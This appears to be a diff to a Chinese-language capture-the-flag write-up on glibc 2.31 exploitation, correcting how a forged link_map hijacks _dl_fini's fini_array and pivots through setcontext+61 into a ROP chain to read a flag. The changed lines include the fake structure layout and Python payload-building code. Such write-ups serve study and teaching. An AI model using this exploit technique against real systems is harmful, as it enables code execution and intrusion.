@@ -425,7 +425,7 @@ _dl_fini (void)
   根据**_dl_fini**逻辑，我们可以发现，**_dl_ns**数组元素的每一个**_ns_loaded**字段都是**link_map**类型的。而对于**link_map**类型的变量**l**，其**l->l_addr + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr**是一个元素个数为**l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val / sizeof (ElfW(Addr))**的**fini_array**函数指针数组。
   因此，只要我们可以修改任意一个**_dl_ns**数组元素的**_ns_loaded**字段的**l_addr**、**l_info**字段的值，即可劫持执行流
 
-  另一方面，**glibc2.31**下一般**one_gadget**都不太行，其约束条件过多。因此一般通过**setcontext**函数，从而转移栈结构，执行提前构造好的rop。而在**_dl_fini**函数中，当其执行**fini_array**函数指针数组中的第二个函数时，其**rdx**的值恰好为fini_array地址，也就是通过**setcontext**函数转移的目标栈恰好位于我们可以控制的内存区域，则可以完成rop的执行。
+  另一方面，**glibc2.31**下一般**one_gadget**都不太行，其约束条件过多。因此一般通过**setcontext**函数，从而转移栈结构，执行提前构造好的rop。而在**_dl_fini**函数中，当其执行**fini_array**函数指针数组中的倒数第二个函数指针时，其**rdx**的值恰好为fini_array数组最后一个元素的地址，也就是通过**setcontext**函数转移的目标栈恰好位于我们可以控制的内存区域，则可以完成rop的执行。
 
 ### 攻击姿势
 
@@ -760,19 +760,19 @@ struct link_map
 			(char*)fake_link_map_addr + 13 * 8 - 3 * 8
 
 		l_info[26]							offset: 34 * 8
-			(char*)&link_map + 50 * 8
-
-		l_info[28]							offset: 36 * 8
 			(char*)&link_map + 37 * 8
 
-		fini_arraysize:							offset: 38 * 8
+		l_info[28]							offset: 36 * 8
+			(char*)&link_map + 39 * 8
+
+		fini_array:							offset: 38 * 8
+			(char*)&link_map + 52 * 8
+
+		fini_arraysize:							offset: 40 * 8
 			8 * 2
 	
-		fini_array_un:							offset: 50 * 8
-			0x1a
-			(char*)&link_map + 52 * 8
 		fini_array:							offset: 52 * 8
-			lib_base + lib.sym['system']
+			lib_base + lib.sym['setcontext'] + 61
 			lib_base + ret
 		
 		setcontext_rdi:							offset: 66 * 8
@@ -790,7 +790,7 @@ struct link_map
 			
 		
 		l_init_called = 0x800000000					offset: 99 * 8
-		flag:							offset: 100 * 8
+		flag:								offset: 100 * 8
 			'flag\x00'
 	}
 	'''
@@ -809,13 +809,14 @@ struct link_map
 	fake_link_map = fake_link_map.ljust(15 * 8, '\x00')
 	fake_link_map += up64(fake_link_map_addr + 13 * 8 - 3 * 8)			#fake_l_real_4
 	fake_link_map = fake_link_map.ljust(34 * 8, '\x00')
-	fake_link_map += up64(fake_link_map_addr + 50 * 8)				#l_info[26]
-	fake_link_map = fake_link_map.ljust(36 * 8, '\x00')
 	fake_link_map += up64(fake_link_map_addr + 37 * 8)				#l_info[26]
+	fake_link_map = fake_link_map.ljust(36 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr + 39 * 8)				#l_info[26]
 	fake_link_map = fake_link_map.ljust(38 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr + 52 * 8)				#fini_array
+	fake_link_map = fake_link_map.ljust(40 * 8, '\x00')
 	fake_link_map += up64(8 * 2)							#fini_arraysize
-	fake_link_map = fake_link_map.ljust(50 * 8, '\x00')
-	fake_link_map += up64(0x1a) + up64(fake_link_map_addr + 52 * 8)			#fini_array_un
+	fake_link_map = fake_link_map.ljust(52 * 8, '\x00')
 	fake_link_map += up64(lib_base + lib.sym['setcontext'] + 61) + up64(ret)	#fini_array
 	fake_link_map = fake_link_map.ljust(66 * 8, '\x00')
 	fake_link_map += up64(0)							#setcontext_rdi
